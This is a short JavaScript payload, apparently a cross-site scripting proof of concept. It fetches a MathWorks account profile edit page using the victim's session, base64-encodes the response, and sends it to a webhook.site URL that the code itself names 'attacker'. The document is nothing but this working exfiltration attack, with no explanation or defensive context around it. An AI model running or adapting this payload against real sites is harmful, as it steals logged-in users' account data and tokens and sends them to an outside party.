var url = "https://www.mathworks.com/mwaccount/profiles/edit";
var attacker = "https://webhook.site/2b1e7603-af1d-47d2-b943-f1ef58441e90";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);